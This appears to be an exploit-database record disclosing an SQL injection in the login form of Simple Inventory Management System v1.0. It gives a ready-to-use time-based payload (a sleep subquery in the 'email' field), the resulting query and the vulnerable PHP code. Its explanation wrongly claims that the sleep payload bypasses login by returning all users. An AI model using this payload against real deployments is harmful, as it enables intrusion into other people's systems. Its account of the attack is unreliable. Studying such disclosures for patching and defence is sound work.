{"source": "https://www.exploit-db.com/exploits/51808", "vulnName": "Simple Inventory Management System v1.0 - 'email' SQL Injection", "vulnEDBID": "51808", "vulnCVE": "N/A", "author": "SOSPIRO", "exploitType": "REMOTE", "platform": "PHP", "datePublished": "2024-02-26", "vulnContent": "# Exploit Title: Simple Inventory Management System v1.0 -  'email'  SQL Injection\n# Google Dork: N/A\n# Application: Simple Inventory Management System\n# Date: 26.02.2024\n# Bugs: SQL Injection \n# Exploit Author: SoSPiro\n# Vendor Homepage: https://www.sourcecodester.com/\n# Software Link: https://www.sourcecodester.com/php/15419/simple-inventory-management-system-phpoop-free-source-code.html\n# Version: 1.0\n# Tested on: Windows 10 64 bit Wampserver \n# CVE : N/A\n\n\n## Vulnerability Description:\n\nThis code snippet is potentially vulnerable to SQL Injection. User inputs ($_POST['email'] and $_POST['pwd']) are directly incorporated into the SQL query without proper validation or sanitization, exposing the application to the risk of manipulation by malicious users. This could allow attackers to inject SQL code through specially crafted input.\n\n\n## Proof of Concept (PoC):\n\nAn example attacker could input the following values:\n\nemail: test@gmail.com'%2b(select*from(select(sleep(20)))a)%2b'\npwd: test\n\nThis would result in the following SQL query:\n\nSELECT * FROM users WHERE email = 'test@gmail.com'+(select*from(select(sleep(20)))a)+'' AND password = 'anything'\n\nThis attack would retrieve all users, making the login process always successful.\n\nrequest-response foto:https://i.imgur.com/slkzYJt.png\n\n\n## Vulnerable code section:\n====================================================\nims/login.php\n\n<?php \nob_start();\nsession_start();\ninclude('inc/header.php');\n$loginError = '';\nif (!empty($_POST['email']) && !empty($_POST['pwd'])) {\n include 'Inventory.php';\n $inventory = new Inventory();\n\n // Vulnerable code\n $login = $inventory->login($_POST['email'], $_POST['pwd']); \n //\n\nif(!empty($login)) {\n  $_SESSION['userid'] = $login[0]['userid'];\n  $_SESSION['name'] = $login[0]['name'];   \n  header(\"Location:index.php\");\n } else {\n  $loginError = \"Invalid email or password!\";\n }\n}\n?>\n\n\n\n## Reproduce: https://packetstormsecurity.com/files/177294/Simple-Inventory-Management-System-1.0-SQL-Injection.html\n            "}